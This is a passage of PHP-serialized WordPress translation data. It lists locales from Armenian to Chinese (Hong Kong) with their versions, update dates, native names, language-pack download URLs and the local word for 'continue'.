16:21:10\";s:12:\"english_name\";s:8:\"Armenian\";s:11:\"native_name\";s:14:\"Հայերեն\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/hy.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"hy\";i:2;s:3:\"hye\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Շարունակել\";}}s:5:\"id_ID\";a:8:{s:8:\"language\";s:5:\"id_ID\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-06 16:02:41\";s:12:\"english_name\";s:10:\"Indonesian\";s:11:\"native_name\";s:16:\"Bahasa Indonesia\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/id_ID.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"id\";i:2;s:3:\"ind\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Lanjutkan\";}}s:5:\"is_IS\";a:8:{s:8:\"language\";s:5:\"is_IS\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-16 13:36:46\";s:12:\"english_name\";s:9:\"Icelandic\";s:11:\"native_name\";s:9:\"Íslenska\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/is_IS.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"is\";i:2;s:3:\"isl\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Áfram\";}}s:5:\"it_IT\";a:8:{s:8:\"language\";s:5:\"it_IT\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-04 15:41:03\";s:12:\"english_name\";s:7:\"Italian\";s:11:\"native_name\";s:8:\"Italiano\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/it_IT.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"it\";i:2;s:3:\"ita\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Continua\";}}s:2:\"ja\";a:8:{s:8:\"language\";s:2:\"ja\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-03 01:42:19\";s:12:\"english_name\";s:8:\"Japanese\";s:11:\"native_name\";s:9:\"日本語\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/ja.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"ja\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"続ける\";}}s:5:\"ka_GE\";a:8:{s:8:\"language\";s:5:\"ka_GE\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:40:24\";s:12:\"english_name\";s:8:\"Georgian\";s:11:\"native_name\";s:21:\"ქართული\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/ka_GE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ka\";i:2;s:3:\"kat\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:30:\"გაგრძელება\";}}s:3:\"kab\";a:8:{s:8:\"language\";s:3:\"kab\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:39:13\";s:12:\"english_name\";s:6:\"Kabyle\";s:11:\"native_name\";s:9:\"Taqbaylit\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/kab.zip\";s:3:\"iso\";a:2:{i:2;s:3:\"kab\";i:3;s:3:\"kab\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Kemmel\";}}s:2:\"km\";a:8:{s:8:\"language\";s:2:\"km\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-07 02:07:59\";s:12:\"english_name\";s:5:\"Khmer\";s:11:\"native_name\";s:27:\"ភាសាខ្មែរ\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/km.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"km\";i:2;s:3:\"khm\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"បន្ត\";}}s:5:\"ko_KR\";a:8:{s:8:\"language\";s:5:\"ko_KR\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:39:53\";s:12:\"english_name\";s:6:\"Korean\";s:11:\"native_name\";s:9:\"한국어\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/ko_KR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ko\";i:2;s:3:\"kor\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"계속\";}}s:3:\"ckb\";a:8:{s:8:\"language\";s:3:\"ckb\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:25\";s:12:\"english_name\";s:16:\"Kurdish (Sorani)\";s:11:\"native_name\";s:13:\"كوردی‎\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/ckb.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ku\";i:3;s:3:\"ckb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:30:\"به‌رده‌وام به‌\";}}s:2:\"lo\";a:8:{s:8:\"language\";s:2:\"lo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-12 09:59:23\";s:12:\"english_name\";s:3:\"Lao\";s:11:\"native_name\";s:21:\"ພາສາລາວ\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/lo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"lo\";i:2;s:3:\"lao\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:18:\"ຕໍ່​ໄປ\";}}s:5:\"lt_LT\";a:8:{s:8:\"language\";s:5:\"lt_LT\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:34\";s:12:\"english_name\";s:10:\"Lithuanian\";s:11:\"native_name\";s:15:\"Lietuvių kalba\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/lt_LT.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"lt\";i:2;s:3:\"lit\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Tęsti\";}}s:2:\"lv\";a:8:{s:8:\"language\";s:2:\"lv\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-27 07:51:28\";s:12:\"english_name\";s:7:\"Latvian\";s:11:\"native_name\";s:16:\"Latviešu valoda\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/lv.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"lv\";i:2;s:3:\"lav\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Turpināt\";}}s:5:\"mk_MK\";a:8:{s:8:\"language\";s:5:\"mk_MK\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:41\";s:12:\"english_name\";s:10:\"Macedonian\";s:11:\"native_name\";s:31:\"Македонски јазик\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/mk_MK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"mk\";i:2;s:3:\"mkd\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"Продолжи\";}}s:5:\"ml_IN\";a:8:{s:8:\"language\";s:5:\"ml_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 03:43:32\";s:12:\"english_name\";s:9:\"Malayalam\";s:11:\"native_name\";s:18:\"മലയാളം\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ml_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ml\";i:2;s:3:\"mal\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:18:\"തുടരുക\";}}s:2:\"mn\";a:8:{s:8:\"language\";s:2:\"mn\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-12 07:29:35\";s:12:\"english_name\";s:9:\"Mongolian\";s:11:\"native_name\";s:12:\"Монгол\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/mn.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"mn\";i:2;s:3:\"mon\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:24:\"Үргэлжлүүлэх\";}}s:2:\"mr\";a:8:{s:8:\"language\";s:2:\"mr\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:37\";s:12:\"english_name\";s:7:\"Marathi\";s:11:\"native_name\";s:15:\"मराठी\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/mr.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"mr\";i:2;s:3:\"mar\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:25:\"सुरु ठेवा\";}}s:5:\"ms_MY\";a:8:{s:8:\"language\";s:5:\"ms_MY\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-05 09:45:10\";s:12:\"english_name\";s:5:\"Malay\";s:11:\"native_name\";s:13:\"Bahasa Melayu\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/ms_MY.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ms\";i:2;s:3:\"msa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Teruskan\";}}s:5:\"my_MM\";a:8:{s:8:\"language\";s:5:\"my_MM\";s:7:\"version\";s:6:\"4.1.16\";s:7:\"updated\";s:19:\"2015-03-26 15:57:42\";s:12:\"english_name\";s:17:\"Myanmar (Burmese)\";s:11:\"native_name\";s:15:\"ဗမာစာ\";s:7:\"package\";s:65:\"https://downloads.wordpress.org/translation/core/4.1.16/my_MM.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"my\";i:2;s:3:\"mya\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:54:\"ဆက်လက်လုပ်ဆောင်ပါ။\";}}s:5:\"nb_NO\";a:8:{s:8:\"language\";s:5:\"nb_NO\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:42:31\";s:12:\"english_name\";s:19:\"Norwegian (Bokmål)\";s:11:\"native_name\";s:13:\"Norsk bokmål\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/nb_NO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nb\";i:2;s:3:\"nob\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Fortsett\";}}s:5:\"ne_NP\";a:8:{s:8:\"language\";s:5:\"ne_NP\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:31\";s:12:\"english_name\";s:6:\"Nepali\";s:11:\"native_name\";s:18:\"नेपाली\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ne_NP.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ne\";i:2;s:3:\"nep\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:43:\"जारी राख्नुहोस्\";}}s:12:\"nl_NL_formal\";a:8:{s:8:\"language\";s:12:\"nl_NL_formal\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-16 13:24:21\";s:12:\"english_name\";s:14:\"Dutch (Formal)\";s:11:\"native_name\";s:20:\"Nederlands (Formeel)\";s:7:\"package\";s:71:\"https://downloads.wordpress.org/translation/core/4.7.3/nl_NL_formal.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nl\";i:2;s:3:\"nld\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Doorgaan\";}}s:5:\"nl_NL\";a:8:{s:8:\"language\";s:5:\"nl_NL\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-03 13:02:03\";s:12:\"english_name\";s:5:\"Dutch\";s:11:\"native_name\";s:10:\"Nederlands\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/nl_NL.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nl\";i:2;s:3:\"nld\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Doorgaan\";}}s:5:\"nl_BE\";a:8:{s:8:\"language\";s:5:\"nl_BE\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:49:13\";s:12:\"english_name\";s:15:\"Dutch (Belgium)\";s:11:\"native_name\";s:20:\"Nederlands (België)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/nl_BE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nl\";i:2;s:3:\"nld\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Doorgaan\";}}s:5:\"nn_NO\";a:8:{s:8:\"language\";s:5:\"nn_NO\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:40:57\";s:12:\"english_name\";s:19:\"Norwegian (Nynorsk)\";s:11:\"native_name\";s:13:\"Norsk nynorsk\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/nn_NO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nn\";i:2;s:3:\"nno\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Hald fram\";}}s:3:\"oci\";a:8:{s:8:\"language\";s:3:\"oci\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-02 13:47:38\";s:12:\"english_name\";s:7:\"Occitan\";s:11:\"native_name\";s:7:\"Occitan\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/oci.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"oc\";i:2;s:3:\"oci\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Contunhar\";}}s:5:\"pa_IN\";a:8:{s:8:\"language\";s:5:\"pa_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-16 05:19:43\";s:12:\"english_name\";s:7:\"Punjabi\";s:11:\"native_name\";s:18:\"ਪੰਜਾਬੀ\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/pa_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"pa\";i:2;s:3:\"pan\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:25:\"ਜਾਰੀ ਰੱਖੋ\";}}s:5:\"pl_PL\";a:8:{s:8:\"language\";s:5:\"pl_PL\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-09 22:44:40\";s:12:\"english_name\";s:6:\"Polish\";s:11:\"native_name\";s:6:\"Polski\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/pl_PL.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"pl\";i:2;s:3:\"pol\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Kontynuuj\";}}s:2:\"ps\";a:8:{s:8:\"language\";s:2:\"ps\";s:7:\"version\";s:6:\"4.1.16\";s:7:\"updated\";s:19:\"2015-03-29 22:19:48\";s:12:\"english_name\";s:6:\"Pashto\";s:11:\"native_name\";s:8:\"پښتو\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.1.16/ps.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ps\";i:2;s:3:\"pus\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:19:\"دوام ورکړه\";}}s:5:\"pt_BR\";a:8:{s:8:\"language\";s:5:\"pt_BR\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-17 03:35:07\";s:12:\"english_name\";s:19:\"Portuguese (Brazil)\";s:11:\"native_name\";s:20:\"Português do Brasil\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/pt_BR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"pt\";i:2;s:3:\"por\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"pt_PT\";a:8:{s:8:\"language\";s:5:\"pt_PT\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-20 18:48:35\";s:12:\"english_name\";s:21:\"Portuguese (Portugal)\";s:11:\"native_name\";s:10:\"Português\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/pt_PT.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"pt\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:3:\"rhg\";a:8:{s:8:\"language\";s:3:\"rhg\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-03-16 13:03:18\";s:12:\"english_name\";s:8:\"Rohingya\";s:11:\"native_name\";s:8:\"Ruáinga\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/rhg.zip\";s:3:\"iso\";a:1:{i:3;s:3:\"rhg\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:5:\"ro_RO\";a:8:{s:8:\"language\";s:5:\"ro_RO\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:42:11\";s:12:\"english_name\";s:8:\"Romanian\";s:11:\"native_name\";s:8:\"Română\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/ro_RO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ro\";i:2;s:3:\"ron\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuă\";}}s:5:\"ru_RU\";a:8:{s:8:\"language\";s:5:\"ru_RU\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-03 06:09:17\";s:12:\"english_name\";s:7:\"Russian\";s:11:\"native_name\";s:14:\"Русский\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/ru_RU.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ru\";i:2;s:3:\"rus\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Продолжить\";}}s:3:\"sah\";a:8:{s:8:\"language\";s:3:\"sah\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-21 02:06:41\";s:12:\"english_name\";s:5:\"Sakha\";s:11:\"native_name\";s:14:\"Сахалыы\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/sah.zip\";s:3:\"iso\";a:2:{i:2;s:3:\"sah\";i:3;s:3:\"sah\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Салҕаа\";}}s:5:\"si_LK\";a:8:{s:8:\"language\";s:5:\"si_LK\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-12 06:00:52\";s:12:\"english_name\";s:7:\"Sinhala\";s:11:\"native_name\";s:15:\"සිංහල\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/si_LK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"si\";i:2;s:3:\"sin\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:44:\"දිගටම කරගෙන යන්න\";}}s:5:\"sk_SK\";a:8:{s:8:\"language\";s:5:\"sk_SK\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-03-02 14:28:53\";s:12:\"english_name\";s:6:\"Slovak\";s:11:\"native_name\";s:11:\"Slovenčina\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/sk_SK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sk\";i:2;s:3:\"slk\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Pokračovať\";}}s:5:\"sl_SI\";a:8:{s:8:\"language\";s:5:\"sl_SI\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-08 17:57:45\";s:12:\"english_name\";s:9:\"Slovenian\";s:11:\"native_name\";s:13:\"Slovenščina\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/sl_SI.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sl\";i:2;s:3:\"slv\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Nadaljuj\";}}s:2:\"sq\";a:8:{s:8:\"language\";s:2:\"sq\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-29 18:17:50\";s:12:\"english_name\";s:8:\"Albanian\";s:11:\"native_name\";s:5:\"Shqip\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/sq.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sq\";i:2;s:3:\"sqi\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Vazhdo\";}}s:5:\"sr_RS\";a:8:{s:8:\"language\";s:5:\"sr_RS\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:41:03\";s:12:\"english_name\";s:7:\"Serbian\";s:11:\"native_name\";s:23:\"Српски језик\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/sr_RS.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sr\";i:2;s:3:\"srp\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:14:\"Настави\";}}s:5:\"sv_SE\";a:8:{s:8:\"language\";s:5:\"sv_SE\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:40:55\";s:12:\"english_name\";s:7:\"Swedish\";s:11:\"native_name\";s:7:\"Svenska\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/sv_SE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sv\";i:2;s:3:\"swe\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Fortsätt\";}}s:3:\"szl\";a:8:{s:8:\"language\";s:3:\"szl\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-24 19:58:14\";s:12:\"english_name\";s:8:\"Silesian\";s:11:\"native_name\";s:17:\"Ślōnskŏ gŏdka\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/szl.zip\";s:3:\"iso\";a:1:{i:3;s:3:\"szl\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:13:\"Kōntynuować\";}}s:5:\"ta_IN\";a:8:{s:8:\"language\";s:5:\"ta_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 03:22:47\";s:12:\"english_name\";s:5:\"Tamil\";s:11:\"native_name\";s:15:\"தமிழ்\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ta_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ta\";i:2;s:3:\"tam\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:24:\"தொடரவும்\";}}s:2:\"te\";a:8:{s:8:\"language\";s:2:\"te\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:47:39\";s:12:\"english_name\";s:6:\"Telugu\";s:11:\"native_name\";s:18:\"తెలుగు\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/te.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"te\";i:2;s:3:\"tel\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:30:\"కొనసాగించు\";}}s:2:\"th\";a:8:{s:8:\"language\";s:2:\"th\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:43\";s:12:\"english_name\";s:4:\"Thai\";s:11:\"native_name\";s:9:\"ไทย\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/th.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"th\";i:2;s:3:\"tha\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:15:\"ต่อไป\";}}s:2:\"tl\";a:8:{s:8:\"language\";s:2:\"tl\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-30 02:38:08\";s:12:\"english_name\";s:7:\"Tagalog\";s:11:\"native_name\";s:7:\"Tagalog\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/tl.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"tl\";i:2;s:3:\"tgl\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"Magpatuloy\";}}s:5:\"tr_TR\";a:8:{s:8:\"language\";s:5:\"tr_TR\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-17 11:46:52\";s:12:\"english_name\";s:7:\"Turkish\";s:11:\"native_name\";s:8:\"Türkçe\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/tr_TR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"tr\";i:2;s:3:\"tur\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:5:\"Devam\";}}s:5:\"tt_RU\";a:8:{s:8:\"language\";s:5:\"tt_RU\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-20 20:20:50\";s:12:\"english_name\";s:5:\"Tatar\";s:11:\"native_name\";s:19:\"Татар теле\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/tt_RU.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"tt\";i:2;s:3:\"tat\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:17:\"дәвам итү\";}}s:3:\"tah\";a:8:{s:8:\"language\";s:3:\"tah\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-03-06 18:39:39\";s:12:\"english_name\";s:8:\"Tahitian\";s:11:\"native_name\";s:10:\"Reo Tahiti\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/tah.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"ty\";i:2;s:3:\"tah\";i:3;s:3:\"tah\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:5:\"ug_CN\";a:8:{s:8:\"language\";s:5:\"ug_CN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-05 09:23:39\";s:12:\"english_name\";s:6:\"Uighur\";s:11:\"native_name\";s:9:\"Uyƣurqə\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ug_CN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ug\";i:2;s:3:\"uig\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:26:\"داۋاملاشتۇرۇش\";}}s:2:\"uk\";a:8:{s:8:\"language\";s:2:\"uk\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-21 17:42:28\";s:12:\"english_name\";s:9:\"Ukrainian\";s:11:\"native_name\";s:20:\"Українська\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/uk.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"uk\";i:2;s:3:\"ukr\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Продовжити\";}}s:2:\"ur\";a:8:{s:8:\"language\";s:2:\"ur\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-30 07:08:17\";s:12:\"english_name\";s:4:\"Urdu\";s:11:\"native_name\";s:8:\"اردو\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/ur.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ur\";i:2;s:3:\"urd\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:19:\"جاری رکھیں\";}}s:5:\"uz_UZ\";a:8:{s:8:\"language\";s:5:\"uz_UZ\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-15 15:45:53\";s:12:\"english_name\";s:5:\"Uzbek\";s:11:\"native_name\";s:11:\"O‘zbekcha\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/uz_UZ.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"uz\";i:2;s:3:\"uzb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:11:\"Davom etish\";}}s:2:\"vi\";a:8:{s:8:\"language\";s:2:\"vi\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-02-27 02:33:07\";s:12:\"english_name\";s:10:\"Vietnamese\";s:11:\"native_name\";s:14:\"Tiếng Việt\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.3/vi.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"vi\";i:2;s:3:\"vie\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Tiếp tục\";}}s:5:\"zh_CN\";a:8:{s:8:\"language\";s:5:\"zh_CN\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:54:45\";s:12:\"english_name\";s:15:\"Chinese (China)\";s:11:\"native_name\";s:12:\"简体中文\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.3/zh_CN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"zh\";i:2;s:3:\"zho\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"继续\";}}s:5:\"zh_HK\";a:8:{s:8:\"language\";s:5:\"zh_HK\";s:7:\"version\";s:5:\"4.7.3\";s:7:\"updated\";s:19:\"2017-01-26 15:55:14\";s:12:\"english_name\";s:19:\"Chinese (Hong 